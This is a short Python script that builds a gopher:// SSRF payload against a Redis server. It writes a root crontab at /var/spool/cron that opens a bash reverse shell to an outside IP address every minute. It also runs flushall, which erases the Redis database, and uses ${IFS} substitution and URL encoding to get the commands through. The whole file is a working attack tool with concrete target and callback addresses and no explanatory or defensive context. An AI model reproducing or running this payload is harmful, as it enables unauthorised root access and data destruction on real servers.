import urllib.parse


protocol = "gopher://"
ip = "146.56.235.172"
port = "6379"
reverse_ip = "8.137.60.154"
reverse_port = "8888"
cron = "\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/{}/{} 0>&1\n\n\n\n".format(reverse_ip, reverse_port)
filename = "root"
path = "/var/spool/cron"
passwd = ""

cmd = [
    "flushall",
    "set 1 {}".format(cron.replace(" ", "${IFS}")),
    "config set dir {}".format(path),
    "config set dbfilename {}".format(filename),
    "save"
]


if passwd:
    cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"


def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len(x.replace("${IFS}", " "))) + CRLF + x.replace("${IFS}", " ")
    cmd += CRLF
    return cmd


if __name__ == "__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    print(payload)
